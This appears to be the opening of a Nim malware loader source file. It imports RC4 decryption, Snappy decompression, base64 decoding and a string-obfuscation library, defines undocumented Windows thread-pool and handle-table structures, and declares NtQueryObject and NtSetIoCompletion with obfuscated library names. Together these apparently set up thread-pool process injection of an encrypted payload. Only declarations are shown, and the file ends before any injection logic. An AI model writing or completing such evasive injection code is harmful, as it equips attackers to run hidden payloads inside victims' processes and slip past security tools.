import os
import RC4
import math
import winim
import times 
import random
import strutils
import nimprotect
import supersnappy
from std/base64 import decode

const
    PROCESS_HANDLE_INFORMATION = 51
    OBJECT_TYPE_INFORMATION = 2
    IO_COMPLETION_ALL_ACCESS = STANDARD_RIGHTS_REQUIRED or SYNCHRONIZE or 0x3
    STATUS_INFO_LENGTH_MISMATCH = cast[NTSTATUS](0xC0000004)

type
    TP_TASK_CALLBACKS = object
        ExecuteCallback, Unposted: LPVOID

    TP_TASK = object
        Callbacks: ptr TP_TASK_CALLBACKS
        NumaNode: uint32
        IdealProcessor: uint8
        Padding_242: array[3, char]
        ListEntry: LIST_ENTRY

    TP_DIRECT = object
        Task: TP_TASK
        Lock: uint64
        IoCompletionInformationList: LIST_ENTRY
        Callback: LPVOID
        NumaNode: uint32
        IdealProcessor: uint8
        Padding_3: array[3, char]

    PTP_DIRECT = ptr TP_DIRECT

    PROCESS_HANDLE_TABLE_ENTRY_INFO = object
        HandleValue: HANDLE
        HandleCount, PointerCount: ULONG_PTR
        GrantedAccess: ACCESS_MASK
        ObjectTypeIndex, HandleAttributes, Reserved: ULONG

    PPROCESS_HANDLE_TABLE_ENTRY_INFO = ptr PROCESS_HANDLE_TABLE_ENTRY_INFO

    PROCESS_HANDLE_SNAPSHOT_INFORMATION = object
        NumberOfHandles, Reserved: ULONG_PTR
        Handles: array[ANYSIZE_ARRAY, PROCESS_HANDLE_TABLE_ENTRY_INFO]
    
    PPROCESS_HANDLE_SNAPSHOT_INFORMATION = ptr PROCESS_HANDLE_SNAPSHOT_INFORMATION

    PUBLIC_OBJECT_TYPE_INFORMATION = object
        TypeName: UNICODE_STRING
        Reserved: array[22, ULONG]
    
    PPUBLIC_OBJECT_TYPE_INFORMATION = ptr PUBLIC_OBJECT_TYPE_INFORMATION


proc NtQueryObject(
    Handle: HANDLE, 
    ObjectInformationClass: OBJECT_INFORMATION_CLASS, 
    ObjectInformation: PVOID, 
    ObjectInformationLength: ULONG, 
    ReturnLength: PULONG
    ): NTSTATUS {.winapi, stdcall, dynlib: protectString("ntdll"), importc.}

proc NtSetIoCompletion(
    IoCompletionHandle: HANDLE,
    KeyContext: PVOID,
    ApcContext: PVOID,
    IoStatus: NTSTATUS,
    IoStatusInformation: ULONG_PTR 
): NTSTATUS {.winapi, stdcall, dynlib: protectString("ntdll"), importc.}
